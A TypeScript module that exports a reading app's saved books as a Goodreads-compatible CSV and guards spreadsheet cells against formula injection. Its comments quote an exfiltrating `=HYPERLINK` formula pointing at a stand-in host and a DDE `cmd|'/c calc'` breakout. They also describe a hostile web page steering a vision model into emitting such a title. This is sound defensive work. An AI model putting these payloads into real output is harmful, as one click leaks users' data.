import type { Intent, SavedBook } from './storage';

/**
 * The shelf as a CSV Goodreads and StoryGraph will both import.
 *
 * Goodreads closed its write API in 2020, so a file is the only route into either, and
 * StoryGraph reads Goodreads' format. One file therefore serves both, and there is no
 * second exporter to write.
 *
 * Free for everyone, deliberately. `docs/pricing.md` says the paid tier gates one thing
 * only and that the shelf is never gated; taking your own books out is the clearest case
 * of that promise, so this module knows nothing about entitlements.
 */

/**
 * Goodreads has three exclusive shelves and Buki has four piles, so three of ours collapse.
 *
 * Now, Next and Someday are a PRIORITY, not a reading state: the shelf spec says "priority
 * inside a pile is the problem Now/Next/Someday already solves". Mapping Now to
 * `currently-reading` would announce that you are actively reading everything you meant to
 * read next. The `Bookshelves` tag below is what stops the collapse losing the ordering.
 */
const SHELF: Record<Intent, string> = {
  now: 'to-read',
  next: 'to-read',
  someday: 'to-read',
  read: 'read',
};

const HEADER = ['Title', 'Author', 'ISBN', 'Exclusive Shelf', 'Bookshelves', 'Date Added', 'My Review'];

/** RFC 4180. Titles routinely carry commas, and the ISBN below carries quotes. */
function field(value: string): string {
  return /[",\n\r]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

/**
 * A cell holding text this repo did not write, made safe to open in a spreadsheet.
 *
 * THE TITLE IS NOT THE READER'S WORDS AND IT IS NOT OURS. It is what a vision model read
 * off a picture, and the picture came from a page Buki does not control. That makes it
 * untrusted input which has crossed a trust boundary, and CSV is a format Excel, Sheets,
 * LibreOffice and Numbers all EXECUTE when a cell begins `=`, `+`, `-` or `@`.
 *
 * The chain is short: a hostile page carries text steering the model to answer with a
 * title of `=HYPERLINK("http://evil.test?"&A2,"Open")`, the reader saves the book, and
 * months later opens their export to look at it before uploading — which is exactly what
 * `isbnCell` below already assumes people do. One click sends the neighbouring cell to a
 * stranger. `OPENWORK.md` item 46, TM-8.
 *
 * QUOTING IS NOT A DEFENCE. CSV quoting is stripped before the cell is evaluated, so
 * `"=cmd|..."` executes exactly as `=cmd|...` does. The apostrophe is: every one of those
 * four programs treats a leading `'` as "this cell is text", and none of them displays it.
 *
 * ONLY WHEN THE VALUE ACTUALLY STARTS WITH ONE, and that restraint is the point. The
 * primary path for this file is UPLOAD to Goodreads or StoryGraph, not Excel, and those
 * importers read the bytes rather than evaluating them — so an apostrophe on every title
 * would corrupt every title on the honest path to defend the rare one. A real book whose
 * title opens with `-` pays a leading apostrophe on import; a title opening with `=` is not
 * a book title.
 *
 * DELIBERATELY NOT APPLIED TO `isbnCell`, which emits `="978…"` and means to. See there.
 */
const FORMULA = /^[=+\-@\t\r]/;

function text(value: string): string {
  return field(FORMULA.test(value) ? `'${value}` : value);
}

/** Local date parts, so the file says the day the reader would say. */
function parts(at: number): [string, string, string] {
  const d = new Date(at);
  return [
    String(d.getFullYear()),
    String(d.getMonth() + 1).padStart(2, '0'),
    String(d.getDate()).padStart(2, '0'),
  ];
}

/**
 * An ISBN in the form Goodreads uses in its OWN export.
 *
 * A bare 13 digit number opened in Excel becomes 9.78145E+12, and somebody who opens the
 * file to look at it before importing then uploads a column of corrupted ISBNs. Since this
 * is exactly what Goodreads emits, both importers demonstrably read it.
 *
 * Note this reasoning does NOT extend to a UTF-8 BOM, which would protect accented author
 * names in Excel the same way but risks the importer reading the first column as
 * "﻿Title" and failing to find Title at all. The primary path is upload, not Excel,
 * so the wrapper is worth it and the BOM is not.
 *
 * BUT `="…"` IS ITSELF A FORMULA, so the value inside it has to be one this repo can
 * vouch for. A quote in that position breaks out: `="x"&cmd|'/c calc'!A0&""` is a live
 * DDE concatenation, and CSV quoting does not touch it because quoting is stripped before
 * the cell is evaluated. The page cannot reach here — `extractIsbnFromLinks` validates to
 * `[0-9X]{10}` — but OPENLIBRARY CAN: `openLibrary.ts:44` takes `doc.isbn[0]` out of a
 * JSON response and casts it, and openlibrary.org is a wiki anyone may edit.
 *
 * So the formula form is earned by shape, not assumed. Anything else falls through to a
 * plain text cell: the reader still keeps whatever the catalogue said about their book,
 * they simply do not execute it.
 */
const ISBN_SHAPE = /^[0-9-]{9,16}[0-9X]$/i;

function isbnCell(isbn?: string): string {
  if (!isbn) return '';
  // This function owns the WHOLE cell, quoting included, because the choice between the
  // formula form and a text cell cannot be made by a caller applying one escape to all
  // seven columns. That uniform `.map(field)` is what the earlier version did.
  return ISBN_SHAPE.test(isbn) ? field(`="${isbn}"`) : text(isbn);
}

/** The post that sold you. Empty when there is none, never an invented sentence. */
const reviewCell = (saved: SavedBook): string =>
  saved.source ? `Caught from ${saved.source.url}` : '';

/** The whole shelf, in shelf order, newest first. */
export function toGoodreadsCsv(books: SavedBook[]): string {
  const rows = books.map((saved) => {
    const [y, m, d] = parts(saved.savedAt);
    // Per field, NOT `.map(field)`. Two of these carry what a vision model read off a
    // picture on somebody else's page, one carries a URL from that page, and three are
    // values this module built from an enum and a clock. `isbnCell` is a formula on
    // purpose. A single uniform escape over all seven is exactly what breaks the ISBN.
    return [
      text(saved.book.title),
      text(saved.book.author),
      isbnCell(saved.book.isbn),
      field(SHELF[saved.intent]),
      field(`buki-${saved.intent}`),
      field(`${y}/${m}/${d}`),
      text(reviewCell(saved)),
    ].join(',');
  });
  return [HEADER.join(','), ...rows].join('\n');
}

export function shelfFilename(at: number): string {
  return `buki-shelf-${parts(at).join('-')}.csv`;
}
